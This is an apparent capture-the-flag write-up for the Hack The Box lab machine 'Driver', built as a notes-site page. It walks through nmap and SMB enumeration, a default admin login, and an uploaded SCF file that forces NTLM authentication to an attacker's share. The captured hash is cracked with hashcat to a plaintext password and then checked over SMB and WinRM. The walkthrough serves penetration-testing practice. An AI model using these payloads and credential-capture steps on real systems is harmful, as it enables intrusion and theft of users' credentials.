@@ -1,0 +1,728 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="HTB - Driver  Printer exploitation!!
+IP: 10.10.11.106
+1  sudo nmap -sC -sV -oA driver.nmap $ip   Where:"><title>HTB - Driver</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=ico href=https://pietraferreira.github.io/quartz//favicon.ico><link href=https://pietraferreira.github.io/quartz/styles.591589daec716a7d5287f8d56c2c091e.min.css rel=stylesheet><link href=https://pietraferreira.github.io/quartz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://pietraferreira.github.io/quartz/js/darkmode.a93be4d36d657139e957880e320dd457.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://pietraferreira.github.io/quartz/js/popover.37b1455b8f0603154072b9467132c659.min.js></script>
+<script src=https://pietraferreira.github.io/quartz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://pietraferreira.github.io/quartz/js/clipboard.25155053855f45fdc48fd92540bcebc9.min.js></script>
+<script>const BASE_URL="https://pietraferreira.github.io/quartz/",fetchData=Promise.all([fetch("https://pietraferreira.github.io/quartz/indices/linkIndex.7445a8365739bc9f3cde81881782e853.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://pietraferreira.github.io/quartz/indices/contentIndex.5429b6574923cb22d5f244f6cdeb4cb0.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const n=new URL(BASE_URL),s=n.pathname,o=window.location.pathname,i=s==o;addCopyButtons(),addTitleToCodeBlocks();const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=i&&!1;drawGraph("https://pietraferreira.github.io/quartz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2}),initPopover("https://pietraferreira.github.io/quartz",!0,!0)},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/pietraferreira.github.io\/quartz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://pietraferreira.github.io/quartz/js/search.cf33b507388f3dfd5513a2afcda7af41.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://pietraferreira.github.io/quartz/>🪅 Morioh</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>HTB - Driver</h1><p class=meta>Last updated
+Sep 19, 2022</p><ul class=tags><li><a href=https://pietraferreira.github.io/quartz/tags/htb/>Htb</a></li><li><a href=https://pietraferreira.github.io/quartz/tags/writeup/>Writeup</a></li><li><a href=https://pietraferreira.github.io/quartz/tags/hacking/>Hacking</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#reference>Reference</a></li></ol></nav></details></aside><a href=#htb---driver><h1 id=htb---driver><span class=hanchor arialabel=Anchor># </span>HTB - Driver</h1></a><hr><p>Printer exploitation!!</p><p>IP: 10.10.11.106</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV -oA driver.nmap <span class=nv>$ip</span>
+</span></span></code></pre></td></tr></table></div></div><p>Where:</p><ul><li><code>-sC</code>: default scripts.</li><li><code>-sV</code>: version detection (<code>-A</code> enables version detection, OS detection, script scanning and traceroute).</li><li><code>-oA</code>: output to all formats.</li></ul><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-07-17 18:26 BST
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.106
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.027s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE      VERSION
+</span></span><span class=line><span class=cl>80/tcp  open  http         Microsoft IIS httpd 10.0
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8<span class=o>)</span>.
+</span></span><span class=line><span class=cl><span class=p>|</span> http-auth: 
+</span></span><span class=line><span class=cl><span class=p>|</span> HTTP/1.1 <span class=m>401</span> Unauthorized<span class=se>\x</span>0D
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Basic <span class=nv>realm</span><span class=o>=</span>MFP Firmware Update Center. Please enter password <span class=k>for</span> admin
+</span></span><span class=line><span class=cl>135/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds Microsoft Windows <span class=m>7</span> - <span class=m>10</span> microsoft-ds <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: Host: DRIVER<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   3.1.1: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
+</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
+</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
+</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2022-07-18T00:26:41
+</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2022-07-18T00:22:54
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 52.10 seconds
+</span></span></code></pre></td></tr></table></div></div><p>We have <strong>Microsoft IIS 10.0</strong> in port 80, so Windows. It is a <strong>MFP Firmware Update Center</strong> with the username <code>admin</code>.</p><p>We also have 135 and 445, so it is listening on <strong>SMB</strong>.</p><p>We can try:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbclient -L <span class=se>\\</span><span class=nv>$ip</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Enter WORKGROUP<span class=se>\h</span>anato<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>session setup failed: NT_STATUS_ACCESS_DENIED
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>smbclient -N -L <span class=se>\\</span><span class=nv>$ip</span>
+</span></span><span class=line><span class=cl>session setup failed: NT_STATUS_ACCESS_DENIED
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-L</code>: list.</li><li><code>-N</code>: no pass, suppresses the normal password prompt, useful when there is no password.</li></ul><p>We can use CrackMapExec (
+<a href=https://wiki.porchetta.industries/ rel=noopener>CME</a>). It automates assessing the security of <strong>large</strong> Active Directory networks. It makes heavy use of <strong>Impacket</strong>. More info
+<a href=https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/ rel=noopener>here</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cme smb 10.10.11.106
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> Enterprise <span class=m>10240</span> x64 <span class=o>(</span>name:DRIVER<span class=o>)</span> <span class=o>(</span>domain:DRIVER<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:True<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>So the host is <strong>Windows 10 Enterprive 10240 x64</strong>. It could be either a domain controller or a windows bus.</p><p>We go in the website and try the login <code>admin:admin</code> which works! We can see in firmware updates that we can upload a file, very promising. Also, the URL ends in <code>.php</code>.</p><p>We can enumerate the directories:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.10.11.106 -U admin -P admin -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-U</code>: username.</li><li><code>-P</code>: password.</li><li><code>-x</code>: file type.</li></ul><p>Ok, while this is running we can explore the website. We could probably try a
+<a href=https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ rel=noopener>SCF file attack</a>.</p><p>The SCF:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=sb>`</span><span class=o>[</span>Shell<span class=o>]</span><span class=sb>`</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sb>`</span><span class=nv>Command</span><span class=o>=</span><span class=sb>``</span>2<span class=sb>`</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sb>`</span><span class=nv>IconFile</span><span class=o>=</span><span class=se>\\</span>X.X.X.X<span class=se>\s</span>hare<span class=se>\p</span>entestlab.ico<span class=sb>`</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sb>`</span><span class=o>[</span>Taskbar<span class=o>]</span><span class=sb>`</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sb>`</span><span class=nv>Command</span><span class=o>=</span>ToggleDesktop<span class=sb>`</span>
+</span></span></code></pre></td></tr></table></div></div><p>We can use <strong>Responder</strong> (in <code>/usr/share/responder</code>). I forgot THM open so I&rsquo;ll be using <strong>tun1</strong> not <strong>tun0</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ./Responder.py -I tun1
+</span></span></code></pre></td></tr></table></div></div><p>Then we upload our <strong>SCF</strong> file, we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Listening <span class=k>for</span> events...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Client   : 10.10.11.106
+</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Username : DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Hash     : tony::DRIVER:3cf31016af90b3f5:27F3BAFD0569B4BCCB3512953792F56C:01010000000000000093F52B139AD80176C9F467FDFAD8A90000000002000800570056004B00510001001E00570049004E002D004A0047004D00340050004B004A00330038003200470004003400570049004E002D004A0047004D00340050004B004A0033003800320047002E00570056004B0051002E004C004F00430041004C0003001400570056004B0051002E004C004F00430041004C0005001400570056004B0051002E004C004F00430041004C00070008000093F52B139AD80106000400020000000800300030000000000000000000000000200000C0ED0045D2EFEA0FAB50E04EE1CABF0C376E10707EB410B0555517338A2C53A40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Skipping previously captured <span class=nb>hash</span> <span class=k>for</span> DRIVER<span class=se>\t</span>ony
+</span></span></code></pre></td></tr></table></div></div><p>I will try to figure out the hash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat driver.hash -m <span class=m>5600</span> /usr/share/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host memory required <span class=k>for</span> this attack: <span class=m>64</span> MB
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Dictionary cache built:
+</span></span><span class=line><span class=cl>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl>* Passwords.: <span class=m>14344392</span>
+</span></span><span class=line><span class=cl>* Bytes.....: <span class=m>139921507</span>
+</span></span><span class=line><span class=cl>* Keyspace..: <span class=m>14344385</span>
+</span></span><span class=line><span class=cl>* Runtime...: <span class=m>1</span> sec
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TONY::DRIVER:3cf31016af90b3f5:27f3bafd0569b4bccb3512953792f56c:01010000000000000093f52b139ad80176c9f467fdfad8a90000000002000800570056004b00510001001e00570049004e002d004a0047004d00340050004b004a00330038003200470004003400570049004e002d004a0047004d00340050004b004a0033003800320047002e00570056004b0051002e004c004f00430041004c0003001400570056004b0051002e004c004f00430041004c0005001400570056004b0051002e004c004f00430041004c00070008000093f52b139ad80106000400020000000800300030000000000000000000000000200000c0ed0045d2efea0fab50e04ee1cabf0c376e10707eb410b0555517338a2c53a40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000:liltony
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-m</code>: the type of hash, figured out by looking at
+<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" rel=noopener>this</a> table.</li></ul><p>The password is <code>liltony</code>! We can now do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cme smb 10.10.11.106 -u tony -p lilton
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>10240</span> x64 <span class=o>(</span>name:DRIVER<span class=o>)</span> <span class=o>(</span>domain:DRIVER<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           <span class=o>[</span>+<span class=o>]</span> DRIVER<span class=se>\t</span>ony:liltony
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>cme smb 10.10.11.106 -u tony -p liltony --shares                                                                                                                                                                            7s
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> Enterprise <span class=m>10240</span> x64 <span class=o>(</span>name:DRIVER<span class=o>)</span> <span class=o>(</span>domain:DRIVER<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:True<span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           <span class=o>[</span>+<span class=o>]</span> DRIVER<span class=se>\t</span>ony:liltony 
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           <span class=o>[</span>+<span class=o>]</span> Enumerated shares
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           Share           Permissions     Remark
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           -----           -----------     ------
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           ADMIN$                          Remote Admin
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           C$                              Default share
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>445</span>    DRIVER           IPC$                            Remote IPC
+</span></span></code></pre></td></tr></table></div></div><p>We can also try <code>winrm</code> (Windows Remote Management), which normally uses ports 5985 and 5986:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -p5985,5986 10.10.11.106 -n
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-07-17 19:36 BST
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.106
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.035s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT     STATE    SERVICE
+</span></span><span class=line><span class=cl>5985/tcp open     wsman
+</span></span><span class=line><span class=cl>5986/tcp filtered wsmans
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 3.45 seconds
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-n</code>: no DNS resolution.</li></ul><p>We can see that 5985 is indeed open :)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cme winrm 10.10.11.106 -u tony -p liltony                                                                                                                                                                                   4s
+</span></span><span class=line><span class=cl>SMB         10.10.11.106    <span class=m>5985</span>   DRIVER           <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>10240</span> <span class=o>(</span>name:DRIVER<span class=o>)</span> <span class=o>(</span>domain:DRIVER<span class=o>)</span>
